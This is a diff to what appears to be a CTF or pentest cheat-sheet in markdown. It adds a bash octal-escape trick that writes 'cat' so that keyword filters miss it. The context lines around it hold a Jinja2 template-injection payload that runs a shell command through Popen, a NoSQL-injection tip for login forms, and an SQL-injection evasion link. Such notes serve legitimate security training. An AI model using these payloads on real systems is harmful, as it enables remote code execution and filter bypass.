@@ -75,6 +75,7 @@
   - `{{ ''.__class__.__mro__[1].__subclasses__()[408]("id", shell=True, stdout=-1).communicate() }}`
 - Remember to hunt to noSQLi when facing to a login form 
 - Good sqli article: https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/
+- Cat: `$'\143\141\164'`
 
 
 ## Forensics
